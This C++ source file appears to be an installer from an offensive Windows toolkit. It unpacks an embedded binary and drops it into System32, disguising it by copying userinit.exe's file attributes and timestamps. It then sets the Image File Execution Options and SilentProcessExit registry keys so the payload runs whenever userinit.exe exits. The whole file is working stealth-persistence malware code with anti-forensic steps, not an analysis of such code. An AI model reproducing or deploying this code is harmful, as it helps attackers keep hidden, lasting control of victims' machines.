#include <Windows.h>

#include <monstars/file.h>
#include <monstars/logging.h>
#include <monstars/memory.h>
#include <monstars/util.h>

#include "resource.h"

// stampable values - configured via web interface or helper script
constexpr wchar_t c_ListenerName[MAX_PATH] = L"BASKETBALLJONES";

int main()
{
    // load the provider DLL resource
    LPVOID listenerBin = nullptr;
    DWORD providerSize = 0;
    HRSRC resInfo = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_BUPKUS1), L"BUPKUS");
    if (resInfo)
    {
        HGLOBAL res = LoadResource(NULL, resInfo);
        if (res)
        {
            providerSize = SizeofResource(NULL, resInfo);
            listenerBin = LockResource(res);
        }
    }
    if (!listenerBin)
    {
        LOG_LINE_ERROR;
        return ERROR_RESOURCE_DATA_NOT_FOUND;
    }

    // write the provider DLL to disk
    monstars::HeapBuffer pathBuf(MAX_PATH);
    wsprintfW(pathBuf.Get<wchar_t>(), L"\"C:\\WINDOWS\\system32\\%s.exe\"", c_ListenerName);
    if (!monstars::DropAndBlendFile(
        pathBuf.Get<wchar_t>(), static_cast<char*>(listenerBin), providerSize, L"C:\\Windows\\System32\\userinit.exe"))
    {
        LOG_LINE_ERROR;
        return ERROR_WRITE_FAULT;
    }
    if (!monstars::MatchFileTimes(L"C:\\Windows\\System32", L"C:\\Windows\\System32\\userinit.exe"))
    {
        LOG_LINE_ERROR;
        return ERROR_TIME_SKEW;
    }

    // persistence: set up silent process exit monitoring for winlogon.exe
    HKEY iefo = nullptr;
    LSTATUS error = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\userinit.exe",
        0, nullptr, 0, KEY_ALL_ACCESS, nullptr, &iefo, nullptr);
    if (ERROR_SUCCESS != error)
    {
        SetLastError(error);
        LOG_LINE_ERROR;
        return ERROR_KEY_DELETED;
    }
    auto cleanupIFEO = monstars::Finally([&iefo]() noexcept { RegCloseKey(iefo); });

    DWORD gflag = 0x200;  // FLG_MONITOR_SILENT_PROCESS_EXIT
    error = RegSetValueExW(iefo, L"GlobalFlag", 0, REG_DWORD, reinterpret_cast<byte*>(&gflag), sizeof(gflag));
    if (ERROR_SUCCESS != error)
    {
        SetLastError(error);
        LOG_LINE_ERROR;
        return ERROR_REGISTRY_IO_FAILED;
    }

    HKEY monitor = nullptr;
    error = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\userinit.exe",
        0, nullptr, 0, KEY_ALL_ACCESS, nullptr, &monitor, nullptr);
    if (ERROR_SUCCESS != error)
    {
        SetLastError(error);
        LOG_LINE_ERROR;
        return ERROR_KEY_DELETED;
    }
    auto cleanupSPE = monstars::Finally([&monitor]() noexcept { RegCloseKey(monitor); });

    DWORD mode = 1;
    error = RegSetValueExW(monitor, L"ReportingMode", 0, REG_DWORD, reinterpret_cast<byte*>(&mode), sizeof(mode));
    if (ERROR_SUCCESS != error)
    {
        SetLastError(error);
        LOG_LINE_ERROR;
        return ERROR_REGISTRY_IO_FAILED;
    }
    error = RegSetValueExW(monitor, L"MonitorProcess", 0, REG_SZ, pathBuf.Get<byte>(), static_cast<DWORD>(pathBuf.Size()));
    if (ERROR_SUCCESS != error)
    {
        SetLastError(error);
        LOG_LINE_ERROR;
        return ERROR_REGISTRY_IO_FAILED;
    }

    return ERROR_SUCCESS;
}
